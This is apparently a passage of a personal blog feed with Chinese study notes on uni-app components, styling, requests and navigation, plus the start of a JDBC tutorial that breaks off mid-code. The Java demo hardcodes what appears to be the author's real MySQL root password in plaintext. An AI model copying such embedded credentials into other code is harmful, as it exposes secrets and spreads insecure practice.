title="4.组件"></a>4.组件</h2><p>uni-app中提供了大量的组件供我们使用</p><h3 id="1-text组件"><a href="#1-text组件" class="headerlink" title="1.text组件"></a>1.text组件</h3><p>首先第一个便是我们的text组件，用于存放我们的文本内容</p><p>text组件有三个配置属性：selectable、space、encode分别控制 文本是否可选、空格大小、是否解码(默认为true)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;view&gt;</span><br><span class="line">&lt;text selectable=&quot;true&quot; space=&quot;ensp&quot; decode=&quot;true&quot;&gt;唱歌 跳舞 打篮球&lt;/text&gt;</span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><p>其中space中可以选择为ensp（中文字符一半大小），emsp（中文字符空格大小），nbsp（根据字体设置空格大小，无论几个空格都设置成一个字体大小）</p><h3 id="2-view组件"><a href="#2-view组件" class="headerlink" title="2.view组件"></a>2.view组件</h3><p>view组件是类似于div的一个大盒子，一个块级元素</p><p>view中也有很多的配置属性：class、hover-class、hover-stop-propagation、hover-start-time、hover-stay-time</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;view hover-class=&quot;box2-active&quot; hover-start-time=2000 hover-stay-time=2000&gt;big box</span><br><span class="line">&lt;view class=&quot;box&quot; hover-class=&quot;box-active&quot; hover-stop-propagation=&quot;true&quot;&gt;</span><br><span class="line">&lt;text selectable=&quot;true&quot; space=&quot;ensp&quot; style=&quot;font-size: 15px&quot;&gt;唱歌 跳舞 打篮球&lt;/text&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><p>class就是类选项——配置样式，hover-class是点击时触发的样式，hover-stop-propagation用于子组件上，点击子组件时取消父组件的hover-class，hover-start-time是设置样式生效事件，他的参数需要是数字 或者 使用<code>:hover-start-time=&quot;2000&quot;</code>设置，hover-stay-time是控制样式保留时间和上一个类似参数也需要设置成数字或者<code>v-bind</code>绑定</p><h3 id="3-button组件"><a href="#3-button组件" class="headerlink" title="3.button组件"></a>3.button组件</h3><p>button组件顾名思义便是我们的按钮组件，它有5个配置属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;button size=&quot;mini&quot; type=&quot;default&quot; plain=&quot;true&quot;&gt;button1&lt;/button&gt;</span><br><span class="line">&lt;button disabled=&quot;true&quot; loading=&quot;true&quot;&gt;button2&lt;/button&gt;</span><br></pre></td></tr></table></figure><p>size可以选择正常大小和缩小版（mini），type是按钮内部颜色（有primary-微信中是绿色，default-白色，warn-红色三个选择）</p><h3 id="4-image组件"><a href="#4-image组件" class="headerlink" title="4.image组件"></a>4.image组件</h3><p>image组件用于存放图片，存放的图片可以调节大小</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;image src=&quot;/static/logo.png&quot; mode=&quot;aspectFill&quot;&gt;&lt;/image&gt;</span><br><span class="line">&lt;image src=&quot;/static/logo.png&quot; mode=&quot;aspectFile&quot;&gt;&lt;/image&gt;</span><br></pre></td></tr></table></figure><p>src选择图片路径，mode图片缩放模式，如果不写mode，图片就按照规定大小缩放。</p><h2 id="5-样式设置"><a href="#5-样式设置" class="headerlink" title="5.样式设置"></a>5.样式设置</h2><p>uni-app同样为我们提供了强大的样式设置服务</p><p>首先是我们的像素问题，为了实现适用于各个机型，我们采用了<code>rpx</code>-相对像素点的概念</p><p>对于<code>rpx</code>来说，750rpx就是页面宽度的大小，375rpx就是一半的大小</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.div&#123;</span><br><span class="line">width: 750rpx;</span><br><span class="line">height: 375rpx;</span><br><span class="line">background-color: aqua;</span><br><span class="line">font-size: 30rpx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是我们可以引入外部的样式</p><p>在style模块，使用<code>@import url(&#39;path&#39;)</code>实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@import url(&quot;./useStyle.css&quot;);</span><br></pre></td></tr></table></figure><p>这个就引入了同级目录下的css文件</p><p>对于一些全局的样式，我们可以在App.vue中写入，对于局部的样式，我们则在每个单独的文件中写入</p><p>比如，对于一些全局的字体，我们就可以在App.vue中@import引入</p><p>另外还有sass样式，sass样式等我们需要先安装插件（工具 –&gt; 插件安装）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;style lang=&quot;scss&quot;&gt;</span><br><span class="line">@import url(&quot;./useStyle.css&quot;);</span><br><span class="line">.div&#123;</span><br><span class="line">width: 750rpx;</span><br><span class="line">height: 375rpx;</span><br><span class="line">background-color: aqua;</span><br><span class="line">font-size: 30rpx;</span><br><span class="line">view&#123;</span><br><span class="line">color: black;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>然后我们就可以写scss样式了</p><h2 id="6-数据绑定"><a href="#6-数据绑定" class="headerlink" title="6.数据绑定"></a>6.数据绑定</h2><h3 id="1-data与插值语法"><a href="#1-data与插值语法" class="headerlink" title="1.data与插值语法"></a>1.data与插值语法</h3><p>这里的数据绑定和vue的一模一样，使用data做数据响应式，然后使用插值语法<code>&#123;&#123;&#125;&#125;</code>调用就行了，就和vue一样需要注意，<code>&#123;&#123;&#125;&#125;</code>中的语句需要是js表达式。</p><h3 id="2-v-bind和v-for"><a href="#2-v-bind和v-for" class="headerlink" title="2. v-bind和v-for"></a>2. v-bind和v-for</h3><p>这个和vue的bind，for也是一模一样，直接上代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;image :src=&quot;imgAdd&quot; mode=&quot;aspectFit&quot;&gt;&lt;/image&gt;</span><br><span class="line">&lt;view v-for=&quot;p in arr&quot; key=&quot;p.position&quot;&gt;&#123;&#123;p.name+&quot; &quot;+p.age+p.position&#125;&#125;&lt;/view&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data() &#123;</span><br><span class="line">return &#123;</span><br><span class="line">imgAdd:&#x27;https://i2.hdslb.com/bfs/face/c48a662a43b5358e56c2c2b46d2ac803e251b66c.jpg@240w_240h_1c_1s.webp&#x27;,</span><br><span class="line">arr:[</span><br><span class="line">&#123;</span><br><span class="line">name:&quot;张天&quot;,</span><br><span class="line">position:&quot;top&quot;,</span><br><span class="line">age:&quot;19&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">name:&quot;鸽子&quot;,</span><br><span class="line">position:&quot;middle&quot;,</span><br><span class="line">age:&quot;20&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">name:&quot;鹌鹑&quot;,</span><br><span class="line">position:&quot;jungle&quot;,</span><br><span class="line">age:&quot;18&quot;</span><br><span class="line">&#125;,</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="3-注册事件"><a href="#3-注册事件" class="headerlink" title="3.注册事件"></a>3.注册事件</h3><p>我们注册事件也是和vue一样</p><p>使用@或者<code>v-on:</code>注册事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 20是参数，$event是本节点 --&gt;</span><br><span class="line">&lt;button type=&quot;primary&quot; @click=&quot;clickEvent(20,$event)&quot;&gt;按钮&lt;/button&gt;</span><br></pre></td></tr></table></figure><h2 id="7-发送请求"><a href="#7-发送请求" class="headerlink" title="7.发送请求"></a>7.发送请求</h2><h3 id="1-发送get请求"><a href="#1-发送get请求" class="headerlink" title="1.发送get请求"></a>1.发送get请求</h3><p>我们通过uni的api发送get请求，形式和ajax类似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">getMsg()&#123;</span><br><span class="line">uni.request(&#123;</span><br><span class="line">url:&quot;http://127.0.0.8080&quot;,</span><br><span class="line">success(res) &#123;</span><br><span class="line">console.log(res)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-缓存"><a href="#2-缓存" class="headerlink" title="2.缓存"></a>2.缓存</h3><p>对于缓存，我们有存取删除三个方法</p><p>先是储存数据，使用<code>uni.setStorage</code>，其中放入一对<code>key</code>，<code>data</code>作为键值对</p><p>success，fail，complete三个函数作为成功，失败，执行完成之后的回调函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">setStorage()&#123;</span><br><span class="line">uni.setStorage(&#123;</span><br><span class="line">key:&quot;id&quot;,</span><br><span class="line">data:80,</span><br><span class="line">// 函数是成功的回调</span><br><span class="line">success()&#123;</span><br><span class="line">console.log(&quot;存储成功&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>取数据，使用<code>uni.getStorage</code>，放入key作为get的条件</p><p>同样有三个回调函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getStorage()&#123;</span><br><span class="line">uni.getStorage(&#123;</span><br><span class="line">key:&quot;id&quot;,</span><br><span class="line">success(res)&#123;</span><br><span class="line">console.log(&quot;获取成功&quot;,res.data)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有删除数据——<code>uni.removeStorage</code></p><p>但是这些都是异步方法（aync）：</p><p>我们还有同步方法（Sync）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//sync同步</span><br><span class="line">uni.setStorageSync(&#x27;id&#x27;,100)</span><br></pre></td></tr></table></figure><p>get和remove也同样有同步方法</p><p>但是因为同步就没有回调函数</p><h3 id="3-上传图片"><a href="#3-上传图片" class="headerlink" title="3.上传图片"></a>3.上传图片</h3><p>我们可以通过<code>chooseImage</code>函数上传图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">chooseImg()&#123;</span><br><span class="line">// 上传图片函数</span><br><span class="line">uni.chooseImage(&#123;</span><br><span class="line">// 选择上传数量限制</span><br><span class="line">count: 3,</span><br><span class="line">success: res=&gt; &#123;</span><br><span class="line">this.ImgArr = res.tempFilePaths</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应函数还有：</p><p><img src="https://img-blog.csdnimg.cn/e15763c92f954644921209b9bdb990bf.png" alt="上传图片"></p><p>res返回数据中：有一项<code>tempFilePaths</code>获取上传之后的路径，可以通过这个路径展示图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">errMsg: &quot;chooseImage:ok&quot;</span><br><span class="line">tempFilePaths: Array(1)</span><br><span class="line">0: &quot;blob:http://localhost:8080/91ad9888-97c5-4a8f-9111-556e2004c0ec&quot;</span><br><span class="line">length: 1</span><br><span class="line">[[Prototype]]: Array(0)</span><br><span class="line">tempFiles: Array(1)</span><br><span class="line">0: File &#123;name: &#x27;QQ图片20210527080422.jpg&#x27;, lastModified: 1622073855169, lastModifiedDate: Thu May 27 2021 08:04:15 GMT+0800 (中国标准时间), webkitRelativePath: &#x27;&#x27;, …&#125;</span><br><span class="line">length: 1</span><br></pre></td></tr></table></figure><p>展示图片：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;image v-for=&quot;item in ImgArr&quot; :src=&quot;item&quot;&gt;&lt;/image&gt;</span><br></pre></td></tr></table></figure><p>预览图片 ——<code>uni.previewImage(OBJECT)</code></p><p><strong>OBJECT 参数说明</strong></p><table><thead><tr><th align="left">参数名</th><th align="left">类型</th><th align="left">必填</th><th align="left">说明</th><th align="left">平台差异说明</th></tr></thead><tbody><tr><td align="left">current</td><td align="left">String/Number</td><td align="left">详见下方说明</td><td align="left">详见下方说明</td><td align="left"></td></tr><tr><td align="left">urls</td><td align="left">Array<String></td><td align="left">是</td><td align="left">需要预览的图片链接列表</td><td align="left"></td></tr><tr><td align="left">indicator</td><td align="left">String</td><td align="left">否</td><td align="left">图片指示器样式，可取值：”default” - 底部圆点指示器； “number” - 顶部数字指示器； “none” - 不显示指示器。</td><td align="left">App</td></tr><tr><td align="left">loop</td><td align="left">Boolean</td><td align="left">否</td><td align="left">是否可循环预览，默认值为 false</td><td align="left">App</td></tr><tr><td align="left">longPressActions</td><td align="left">Object</td><td align="left">否</td><td align="left">长按图片显示操作菜单，如不填默认为<strong>保存相册</strong></td><td align="left">App 1.9.5+</td></tr><tr><td align="left">success</td><td align="left">Function</td><td align="left">否</td><td align="left">接口调用成功的回调函数</td><td align="left"></td></tr><tr><td align="left">fail</td><td align="left">Function</td><td align="left">否</td><td align="left">接口调用失败的回调函数</td><td align="left"></td></tr><tr><td align="left">complete</td><td align="left">Function</td><td align="left">否</td><td align="left">接口调用结束的回调函数（调用成功、失败都会执行）</td><td align="left"></td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">previewImg(current)&#123;</span><br><span class="line">//img标签中传入代表当前path的item</span><br><span class="line">uni.previewImage(&#123;</span><br><span class="line">current,</span><br><span class="line">//urls是预览图片列表</span><br><span class="line">urls:this.ImgArr</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-跨端兼容"><a href="#4-跨端兼容" class="headerlink" title="4.跨端兼容"></a>4.跨端兼容</h3><p>不同平台的实现代码可能不同</p><p>我们使用注释在不同平台上区别显示代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- #ifdef MP-WEIXIN --&gt;</span><br><span class="line">&lt;view&gt;微信小程序&lt;/view&gt;</span><br><span class="line">&lt;!-- #endif --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- #ifdef H5 --&gt;</span><br><span class="line">&lt;view&gt;H5页面&lt;/view&gt;</span><br><span class="line">&lt;!-- #endif --&gt;</span><br></pre></td></tr></table></figure><h2 id="8-页面跳转"><a href="#8-页面跳转" class="headerlink" title="8.页面跳转"></a>8.页面跳转</h2><p>我们小程序实现页面跳转和路由跳转有声明式和编程式两种方法</p><p>声明式：使用navigator标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;navigator url=&quot;/pages/List/List&quot; open-type=&quot;switchTab&quot;&gt;跳转至新闻页面&lt;/navigator&gt;</span><br></pre></td></tr></table></figure><p>其中open-type携带的函数有：</p><p><strong>open-type 有效值</strong></p><table><thead><tr><th align="left">值</th><th align="left">说明</th><th align="left">平台差异说明</th></tr></thead><tbody><tr><td align="left">navigate</td><td align="left">对应 uni.navigateTo 的功能</td><td align="left"></td></tr><tr><td align="left">redirect</td><td align="left">对应 uni.redirectTo 的功能，跳转unload之前的页面</td><td align="left"></td></tr><tr><td align="left">switchTab</td><td align="left">对应 uni.switchTab 的功能，跳转到tabbar页面（始终位于页面下方导航栏的页面）</td><td align="left"></td></tr><tr><td align="left">reLaunch</td><td align="left">对应 uni.reLaunch 的功能</td><td align="left">字节跳动小程序与飞书小程序不支持</td></tr><tr><td align="left">navigateBack</td><td align="left">对应 uni.navigateBack 的功能</td><td align="left"></td></tr><tr><td align="left">exit</td><td align="left">退出小程序，target=”miniProgram”时生效</td><td align="left">微信2.1.0+、百度2.5.2+、QQ1.4.7+</td></tr></tbody></table><p>编程式：</p><p>编程式就是使用函数跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">goTo()&#123;</span><br><span class="line">uni.navigateTo(&#123;</span><br><span class="line">url:&quot;/subpages/chat/chat&quot;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也有几种方法，和navigator中open-type对应的几个属性相关</p><p>其中<code>switchTab</code>方法会让之前不是tabbar的页面全部卸载</p><p>还可以在url后面携带参数，传参</p><p>在onload的时候通过option获取</p><h2 id="9-组件"><a href="#9-组件" class="headerlink" title="9.组件"></a>9.组件</h2><p>uni的组件和vue的很像，注册方式，引入方式一样</p><h3 id="1-组件生命周期"><a href="#1-组件生命周期" class="headerlink" title="1.组件生命周期"></a>1.组件生命周期</h3><p><code>uni-app</code> 组件支持的生命周期，与vue标准组件的生命周期相同。这里没有页面级的onLoad等生命周期：</p><table><thead><tr><th align="left">函数名</th><th align="left">说明</th><th align="left">平台差异说明</th><th align="left">最低版本</th></tr></thead><tbody><tr><td align="left">beforeCreate</td><td align="left">在实例初始化之前被调用。<a href="https://cn.vuejs.org/v2/api/#beforeCreate">详见(opens new window)</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">created</td><td align="left">在实例创建完成后被立即调用。<a href="https://cn.vuejs.org/v2/api/#created">详见(opens new window)</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">beforeMount</td><td align="left">在挂载开始之前被调用。<a href="https://cn.vuejs.org/v2/api/#beforeMount">详见(opens new window)</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">mounted</td><td align="left">挂载到实例上去之后调用。<a href="https://cn.vuejs.org/v2/api/#mounted">详见 (opens new window)</a>注意：此处并不能确定子组件被全部挂载，如果需要子组件完全挂载之后在执行操作可以使用<code>$nextTick</code><a href="https://cn.vuejs.org/v2/api/#Vue-nextTick">Vue官方文档(opens new window)</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">beforeUpdate</td><td align="left">数据更新时调用，发生在虚拟 DOM 打补丁之前。<a href="https://cn.vuejs.org/v2/api/#beforeUpdate">详见(opens new window)</a></td><td align="left">仅H5平台支持</td><td align="left"></td></tr><tr><td align="left">updated</td><td align="left">由于数据更改导致的虚拟 DOM 重新渲染和打补丁，在这之后会调用该钩子。<a href="https://cn.vuejs.org/v2/api/#updated">详见(opens new window)</a></td><td align="left">仅H5平台支持</td><td align="left"></td></tr><tr><td align="left">beforeDestroy</td><td align="left">实例销毁之前调用。在这一步，实例仍然完全可用。<a href="https://cn.vuejs.org/v2/api/#beforeDestroy">详见(opens new window)</a></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">destroyed</td><td align="left">Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。<a href="https://cn.vuejs.org/v2/api/#destroyed">详见(opens new window)</a></td><td align="left"></td><td align="left"></td></tr></tbody></table><h3 id="2-组件通信"><a href="#2-组件通信" class="headerlink" title="2.组件通信"></a>2.组件通信</h3><p>组件间通信的方式还是和vue类似</p><p>使用<code>props</code>，<code>$emit</code>，<code>$on</code>进行传值</p><p>自定义事件中就是使用<code>$emit</code>发出参数，<code>$on</code>接收参数</p><h3 id="3-uni-ui"><a href="#3-uni-ui" class="headerlink" title="3.uni-ui"></a>3.uni-ui</h3><p>一个uni提供的组件库</p><p>提供一个类似于element-ui的组件库，通过下载导入到components中</p><p>以组件的方式注册，使用</p>]]></content>
    
    
    
    <tags>
      
      <tag>小程序</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JDBC</title>
    <link href="/2022/07/04/JDBC/"/>
    <url>/2022/07/04/JDBC/</url>
    
    <content type="html"><![CDATA[<h1 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>概念：使用java语言操作关系型数据库的一套API</p><p>本质：一套操作所有关系型数据库的规则，即接口</p><p>好处：各数据厂商使用相同接口，java不需要针对不同数据库分别开发</p><h2 id="2-数据库配置"><a href="#2-数据库配置" class="headerlink" title="2.数据库配置"></a>2.数据库配置</h2><h3 id="2-1-navicat链接数据库"><a href="#2-1-navicat链接数据库" class="headerlink" title="2.1 navicat链接数据库"></a>2.1 navicat链接数据库</h3><p>我们首先下载mysql数据库和navicat</p><p>在管理员cmd下进入mysql的bin目录然后通过<code>net start mysql</code>启动数据库</p><p>启动数据库之后打开navicat，点击左上角的链接，进入链接页面</p><p><img src="https://s2.loli.net/2022/07/14/KeAjbqy6GJlt7Bn.png" alt="navicat链接数据库.png"></p><p>链接名可以自己取，端口是mysql的端口，然后输入mysql的root密码就可以登录</p><p>进入之后就可以看到我们数据库的可视化页面</p><h3 id="2-2-idea链接数据库"><a href="#2-2-idea链接数据库" class="headerlink" title="2.2 idea链接数据库"></a>2.2 idea链接数据库</h3><p>然后进入我们的idea，点击右上角的database和加号选择数据库（mysql）</p><p><img src="https://s2.loli.net/2022/07/14/HPRoAYqXjdkBliu.png" alt="创建数据库.png"></p><p>填写好后点击Test Connection测试</p><p>测试成功后点击左上角file中的project structure之后进入加入jar，jar需要在mysql官网上下载</p><p><img src="https://s2.loli.net/2022/07/14/oVCcmGAgIUe8qOl.png" alt="添加jar.png"></p><p>接下来，我们需要建立一个lib文件夹，我们将链接java和mysql的jar文件放入进去，然后将这个文件<code>add as library</code>然后level选择<code>module library</code></p><p>然后我们的数据库操作就算完成了</p><h2 id="3-快速入门"><a href="#3-快速入门" class="headerlink" title="3.快速入门"></a>3.快速入门</h2><p>我们现在使用JDBC查询我们的数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">package com.itheima.JDBC;</span><br><span class="line"></span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.DriverManager;</span><br><span class="line">import java.sql.ResultSet;</span><br><span class="line">import java.sql.Statement;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class demo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //1.注册驱动</span><br><span class="line">        String driver = &quot;com.mysql.cj.jdbc.Driver&quot;;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line"></span><br><span class="line">        //2.获取链接</span><br><span class="line">        String url = &quot;jdbc:mysql://127.0.0.1:3306/db1&quot;;</span><br><span class="line">        String username = &quot;root&quot;;</span><br><span class="line">        String password = &quot;ztdgz947&quot;;</span><br><span class="line">        Connection conn = DriverManager.getConnection(url,username,password);</span><br><span class="line"></span><br><span class="line">        //3.定义sql语句</span><br><span class="line">        String sql = &quot;select * from school&quot;;</span><br><span class="line"></span><br><span class="line">        //4.获取sql对象</span><br><span class="line">        Statement stmt = conn.createStatement();</span><br><span class="line"></span><br><span class="line">        //5.执行sql</span><br><span class="line">        ResultSet result = stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        //6.处理结果</span><br><span class="line">        while (result.next())&#123;</span><br><span class="line">            System.out.println(result.getString(1)+&quot;\t&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //7.释放资源</span><br><span class="line">        stmt.close();</span><br><span class="line">        conn.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要步骤是7步，最后我们执行可能会出现</p><p>1.driver驱动的问题：我们就修改驱动</p><p>2.中文乱码问题，我们进入file-&gt;setting-&gt;file encodings中把规范改为GBK</p><h2 id="4-API详解"><a href="#4-API详解" class="headerlink" title="4.API详解"></a>4.API详解</h2><h3 id="1-DriverManager"><a href="#1-DriverManager" class="headerlink" title="1.DriverManager"></a>1.DriverManager</h3><p>DriverManager用于注册我们的Driver驱动，在上面的forname源码中，其实就用到了我们的DriverManager方法</p><h3 id="2-Connection"><a href="#2-Connection" class="headerlink" title="2.Connection"></a>2.Connection</h3><p>作用：</p><p>1.获取执行sql的对象</p><p>普通执行对象：<code>Statement createStatement()</code></p><p>预编译sql的执行sql对象：防止sql注入：<code>PreparedStatement(sql)</code></p><p>执行存储过程对象：<code>CallableStatement prepareCall(sql)</code></p><p>2.事务管理</p><p>mysql的事务管理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">开启事务：BEGIN;/START TRANSACTION;</span><br><span class="line">提交事务：COMMIT;</span><br><span class="line">回滚事务：ROLLBACK;</span><br><span class="line"></span><br><span class="line">MySQL默认自动提交事务</span><br></pre></td></tr></table></figure><p>JDBC事务管理：Connection接口中定义了三个对应的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">开启事务：setAutoCommit(boolean autoCommit):true为自动提交事务；false为手动提交</span><br><span class="line">提交事务：commit()</span><br><span class="line">回滚事务：rollback()</span><br></pre></td></tr></table></figure><p>对应到我们的代码中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    //开启事务</span><br><span class="line">    conn.setAutoCommit(false);</span><br><span class="line">    //5.执行sql</span><br><span class="line">    ResultSet result1 = stmt.executeQuery(sql1);</span><br><span class="line"></span><br><span class="line">    //6.处理结果</span><br><span class="line">    while (result1.next())&#123;</span><br><span class="line">        System.out.println(result1.getString(1)+&quot;\t&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //执行第二个sql语句需要放在第一个sql语句执行完成之后</span><br><span 